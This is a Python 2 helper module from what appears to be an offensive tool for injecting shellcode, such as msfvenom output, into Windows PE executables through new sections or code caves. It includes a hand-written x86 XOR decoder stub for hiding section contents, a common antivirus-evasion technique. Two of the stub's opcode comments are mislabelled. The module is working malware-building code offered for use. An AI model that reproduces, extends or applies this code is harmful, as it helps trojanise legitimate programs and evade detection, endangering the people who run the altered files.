# Generic functions
import os
import sys
import struct
import argparse
import string
import random

def signal_handler(signal, frame):
    print '\nProgram interrupted by user.\nExiting...'
    sys.exit(0)

# Open file (filename), and returns content
def open_file(filename):
    if os.path.isfile(filename):
        with open(filename, "r") as fin:
            return fin.read()
    else:
        print "\n[!] File (%s) doesn't exist\nExiting..." % (filename)
        sys.exit(1)

# Get section's characteristics
def pe_flags_characteristics(characteristics):
    result = ""
    result += "r" if ((characteristics & 0x40000000) != 0) else "-"
    result += "w" if ((characteristics & 0x80000000) != 0) else "-"
    result += "x" if ((characteristics & 0x20000000) != 0) else "-"
    return result

def display_ASM_instructions(instructions, start_address):
    print " - ASM instructions @(%s)" % (hex(start_address))
    for i in instructions.split("\n"):
        print "\t%s" % (i)

# Find a specific section (with name), and give it back (with index)
def find_section(sections, section_name):
    index = 0
    for section in sections:
        if section_name in section.Name:
            return section, index
        index+=1
    return None,-1

# Create a section name (max size: 5)
def gen_section_name(new_sec_name):
    new_section_name = ".%s" % ("".join(random.choice(string.ascii_letters) for x in range(5)))
    if new_sec_name is not None:
        if len(new_sec_name) > 0 and len(new_sec_name) <= 5:
            if (new_sec_name[0] != "."):
                new_section_name = ".%s" % (new_sec_name)
            else:
                new_section_name = "%s" % (new_sec_name)
    return new_section_name

# Create XOR (ASM) routine
def xor_routine_asm(end_address, start_address=None, key=0xA0):
    xor_routine = "\x90\x90\x90\x90"                    # NOPs
    xor_routine += "\x5F"                               # POP EDI
    #xor_routine += "\x57"                              # PUSH EDI
    xor_routine += "\x60"                               # PUSHAD
    xor_routine += "\x9c"                               # PUSHFD
    xor_routine += "\x89\xfd"                           # MOV EBP, EDI

    if (start_address != None):                         # If there is a start address (i.e.: XOR other sections)
        xor_routine += "\x81\xC7" + p(start_address)

    # XOR loop
    xor_routine += "\x81\xc5" + p(end_address)          # ADD EBP, {ADDR}
    xor_routine += "\x80\x37" + chr(key)                # Key for XOR routine
    #xor_routine += "\x90\x90\x90"
    xor_routine += "\x47"                               # INC EDI
    xor_routine += "\x39\xef"                           # CMP EDI, EBP
    xor_routine += "\x0f\x8e\xf4\xff\xff\xff"           # JLE backwards
    xor_routine += "\x9d"                               # POPAD
    xor_routine += "\x61"                               # POPFD
    xor_routine += ""
    return xor_routine

# Return reversed address
def p(address):
    return struct.pack("<i", address)

def user_choice_int(msg, error_msg, max, min=0):
    while True:
        response = raw_input(msg)
        try:
            response = int(response)
            if (response < min) or (response > max):
                print error_msg
            else:
                return response
        except ValueError:
            print "[!] Enter valid index please"

# Get list of (user's given) section(s) to be XORed
def user_given_sections(all_sections, section_name):
    # Default
    if section_name == None or (len(section_name) == 0):
        section_name = ".text"

    list_sections = []
    try:
        for s in list(section_name.split(",")):
            section, index = find_section(all_sections, s)
            if section == None:
                print "\n[!] Can't find section name (\"%s\"), use --analyse to see PE's sections\nExiting..." % (s)
                sys.exit(1)
            list_sections.append((section,index))
    except:
        print "[!] Can't understand given section(s), use --analyse to see PE's sections\nExiting..."
        sys.exit(1)

    return list_sections

def calc_jmp_offset(origin, dest):
    return p(dest-origin)


# Args parser
def parser():
    parser = argparse.ArgumentParser(description="Add a shellcode to an existing PE (x86) or hide the content of a PE", formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument('--file', '-f', required=True, help="PE file to work with")
    parser.add_argument('--analyse', required=False, action="store_true", help="Analyse PE file (sections, entry point, etc.)")
    parser.add_argument('--fcc', required=False, action="store_true", help="Find code cave to put shellcode into")
    parser.add_argument('--new-sec', required=False, metavar="", help="Add shellcode into new PE section (technique 1)")
    parser.add_argument('--shellcode', required=False, metavar="FILE", help="Shellcode to be added to PE file (msfvenom type C format), default: new section (technique 1)")
    parser.add_argument('--sh-cc', required=False, action="store_true", help="Use a code-cave to inject shellcode (technique 2)")
    parser.add_argument('--new-sec-name', required=False, metavar="", help="New section name (5 chars max), otherwise will be randomly generated")
    parser.add_argument('--xor', required=False, action="store_true", help="XOR section(s) (default: .text section)")
    parser.add_argument('--xor-sec', required=False, metavar="\"section\"", help="XOR a particular section")
    parser.add_argument('--output', required=False, metavar="FILE", help="Output (PE) file")
    parser.add_argument('--verbose', '-v', required=False, action="store_true", help="Verbose")
    parser.add_argument('--test', required=False, action="store_true", help="test")
    return parser.parse_args()
